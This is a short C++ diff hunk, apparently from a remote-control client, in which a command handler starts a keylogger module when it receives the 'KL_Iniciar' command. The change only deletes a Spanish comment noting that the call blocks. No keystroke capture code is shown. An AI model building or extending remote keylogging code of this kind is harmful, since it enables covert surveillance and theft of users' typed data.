@@ -329,7 +329,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::KL_Iniciar) {
         if (this->mod_Key == nullptr) {
             this->mod_Key = new mod_Keylogger();
-            this->mod_Key->Start(); //aqui bloquea
+            this->mod_Key->Start();
         }
         return;
     }
